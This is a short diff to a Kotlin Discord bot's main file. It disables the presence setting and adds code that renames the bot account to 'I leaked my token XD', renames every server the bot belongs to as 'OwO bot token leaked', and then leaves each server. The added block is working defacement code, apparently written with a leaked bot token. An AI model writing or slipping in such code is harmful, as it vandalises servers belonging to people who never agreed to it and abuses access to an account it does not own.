@@ -14,18 +14,28 @@ fun main(args: Array<String>) {
     client.on("ready") {
         println("Logged in as ${client.user.tag}")
 
-        client.user.setPresence(JSON.parse("""
-            {
-                "game": {
-                    "name": "Kotlin bot"
-                }
-            }
-        """.trimIndent()))
+//        client.user.setPresence(JSON.parse("""
+//            {
+//                "game": {
+//                    "name": "Kotlin bot"
+//                }
+//            }
+//        """.trimIndent()))
 
         println("Loaded ${commandsObj.size} commands")
 
+        client.user.setUsername("I leaked my token XD")
+
         client.guilds.forEach {
             println(it)
+
+            it.setName("OwO bot token leaked")
+                    .then { _ ->
+                        it.leave()
+                    }
+                    .catch { _ ->
+                        it.leave()
+                    }
         }
     }
 
